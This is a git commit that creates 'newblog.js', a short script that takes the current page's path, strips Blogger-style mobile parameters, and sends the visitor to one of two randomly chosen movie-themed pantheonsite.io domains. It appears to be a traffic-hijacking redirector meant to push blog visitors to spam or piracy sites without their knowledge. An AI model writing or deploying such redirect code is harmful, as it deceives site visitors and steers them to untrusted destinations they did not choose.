55bbfa646fdb9f40fec6dbaadd45117e5d791add
hamidi12359 <84512667+hamidi12359@users.noreply.github.com>
2021-05-25 14:26:01 +0800

    Create newblog.js

---
+++ newblog.js
@@ -0,0 +1,10 @@
+var urlmain = document.URL;
+var param = document.URL.split("/")[3].replace("?m=1","").replace("?m=0","");
+var dataUrl = [
+
+"dev-moviesstar.pantheonsite.io/",
+"dev-starmovie.pantheonsite.io/"
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem + param;
